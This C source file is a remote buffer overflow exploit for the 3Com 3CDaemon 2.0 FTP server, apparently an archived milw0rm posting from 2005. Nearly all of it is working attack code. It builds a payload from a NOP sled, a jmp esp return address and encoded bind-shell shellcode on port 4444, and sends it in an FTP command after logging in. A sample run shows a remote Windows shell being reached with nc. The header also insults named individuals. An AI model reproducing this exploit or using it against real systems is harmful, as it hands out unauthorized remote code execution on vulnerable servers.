/* Email fixed brotha /str0ke */
/*
     3Com Ftp Server remote overflow exploit
     author : c0d3r "kaveh razavi" c0d3rz_team@yahoo.com
  package : 3CDaemon version 2.0 revision 10
  advisory : http://secway.org/advisory/ad20041011.txt
  company address : 3com.com
  it is just a simple PoC tested on winxp sp 1 and may not work on other systems .
  just a lame coded software that didnt cost to bother myself to develop
  the exploit code . every command has got overflow .
  compiled with visual c++ 6 : cl 3com.c
  greetz : LorD and NT of Iran Hackers Sabotages , irc.zirc.org #ihs
  Jamie of exploitdev (hey man how should I thank u with ur helps?),
  sIiiS and vbehzadan of hyper-security , pishi , redhat , araz , simorgh
  securiteam , roberto of zone-h , milw0rm (dont u see that my mail address has changed?)
  Lamerz :
  shervin_kesafat@yahoo.com with a fucked ass ! , konkoor ( will be dead soon !! )
  ashiyane digital lamerz team ( abroo har chi iranie bordin khak barsara ! )

/*
/*
D:\projects>3com.exe 127.0.0.1 21 c0d3r secret

-------- 3Com Ftp Server remote exploit by c0d3r --------

[*] building overflow string
[*] attacking host 127.0.0.1
[*] packet size = 673 byte
[*] connected
[*] sending username
[*] sending password
[*] exploit sent successfully try nc 127.0.0.1 4444

D:\projects>nc 127.0.0.1 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\3Com\3CDaemon>

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define address 0x77A7EE6C // jmp esp lays in shell32.dll in my box
#define size 673 // 3 byte command + 235 byte NOP junk +
                           // 4 byte return address + 430 byte shellc0de

 int main (int argc, char *argv[]){

 char shellc0de[] = // some NOPS + shellcode bind port 4444

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\xEB\x10\x5A\x4A\x33\xC9\x66"
"\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF"
"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";
  
  unsigned char *recvbuf,*user,*pass;
  unsigned int rc,addr,sock,rc2 ;
  struct sockaddr_in tcp;
  struct hostent *hp;
  WSADATA wsaData;
  char buffer[size];
  unsigned short port;
  char *ptr;
  long *addr_ptr;
  int NOP_LEN = 200,i,x=0,f = 200;
  if(argc < 5) {
      printf("\n-------- 3Com Ftp Server remote exploit by c0d3r --------\n");
   printf("-------- usage : 3com.exe host port user pass --------\n");
   printf("-------- eg: 3com.exe 127.0.0.1 21 c0d3r secret --------\n\n");
  exit(-1) ;
  }
  printf("\n-------- 3Com Ftp Server remote exploit by c0d3r --------\n\n");
  recvbuf = malloc(256);
  memset(recvbuf,0,256);
  
  //Creating exploit code
  printf("[*] building overflow string");
    memset(buffer,0,size);
       ptr = buffer;
       addr_ptr = (long *) ptr;
 
     for(i=0;i < size;i+=4){
   *(addr_ptr++) = address;
  }
   buffer[0] = 'C';buffer[1] = 'D';buffer[2] = ' ';
   for(i = 3;i != 235;i++){
   buffer[i] = 0x90;
  }
     i = 239;
  for(x = 0;x != strlen(shellc0de);x++,i++){
   buffer[i] = shellc0de[x];
  }
  buffer[size] = 0;
 
  //EO exploit code

  user = malloc(256);
  memset(user,0,256);

  pass = malloc(256);
  memset(pass,0,256);

  sprintf(user,"user %s\r\n",argv[3]);
  sprintf(pass,"pass %s\r\n",argv[4]);
  
   if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("[-] WSAStartup failed !\n");
   exit(-1);
  }
 hp = gethostbyname(argv[1]);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp) && (addr == INADDR_NONE) ){
   printf("[-] unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){
   printf("[-] socket() error...\n");
   exit(-1);
  }
   if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
  tcp.sin_family = AF_INET;
  port=atoi(argv[2]);
  tcp.sin_port=htons(port);
   
  
  printf("\n[*] attacking host %s\n" , argv[1]) ;
  
  Sleep(1000);
  
  printf("[*] packet size = %d byte\n" , sizeof(buffer));
  
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
     Sleep(1000) ;
  printf("[*] connected\n") ;
     rc2=recv(sock,recvbuf,256,0);
     printf("[*] sending username\n");
     send(sock,user,strlen(user),0);
     send(sock,'\n',1,0);
     printf("[*] sending password\n");
     Sleep(1000);
  send(sock,pass,strlen(pass),0);
     send(sock,buffer,strlen(buffer),0);
  send(sock,'\n',1,0);
     printf("[*] exploit sent successfully try nc %s 4444\n" , argv[1]);
  }
  
  else {
      printf("[-] 3CDaemon is not listening .... \n");
 }
  shutdown(sock,1);
  closesocket(sock);
  

}

// milw0rm.com [2005-02-17]
